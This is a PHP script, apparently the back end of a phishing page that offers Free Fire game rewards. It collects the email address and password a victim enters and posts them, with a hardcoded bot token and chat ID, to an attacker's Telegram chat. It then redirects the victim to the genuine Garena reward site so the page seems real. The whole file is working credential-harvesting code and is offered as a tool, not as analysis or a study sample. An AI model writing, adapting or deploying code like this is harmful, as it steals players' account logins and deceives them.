<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $reward = $_POST['rewardType'];

    $message = "🎯 *Data Login Free Fire*\n\n";
    $message .= "🎁 *Reward:* $reward\n";
    $message .= "📧 *Email:* $email\n";
    $message .= "🔑 *Password:* $password\n\n";
    $message .= "🚀 *Segera cek datanya!*";

    // Token & Chat ID Telegram
    $token = "7783606251:AAHfso5w1XcaUwJYE_VnHSd2hl8x8S4AqAU";
    $chat_id = "7711427708";

    // Kirim data ke Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);

    // Redirect ke halaman gagal agar terlihat asli
    header("Location: https://reward.ff.garena.com");
    exit();
}
?>
